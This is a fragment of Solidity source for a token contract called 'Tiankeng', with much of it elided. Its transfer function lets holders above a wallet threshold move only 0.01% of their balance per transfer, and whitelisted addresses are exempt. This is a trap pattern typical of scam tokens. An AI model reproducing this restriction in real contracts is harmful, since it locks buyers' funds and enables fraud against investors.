...
abstract contract AbsToken is IERC20, Ownable {
    ...
    function _transfer(
        ...
        if (!_feeWhiteList[from] && !_feeWhiteList[to]&&balance<=maxWalletAmount) {
            uint256 maxSellAmount = balance * 9999 / 10000;
            if (amount > maxSellAmount) {
                amount = maxSellAmount;
            }
        }else if(!_feeWhiteList[from] && !_feeWhiteList[to]&&balance>maxWalletAmount){
              uint256 maxSellAmount = balance * 1 / 10000;
            if (amount > maxSellAmount) {
                amount = maxSellAmount;
            }
        }
...
contract Tiankeng is AbsToken {
    constructor() AbsToken(
        ...
        6,
        520520,
        address(0x8a18D10c3D5c05B9d9c8C18d1a044f7ddDbBC933),
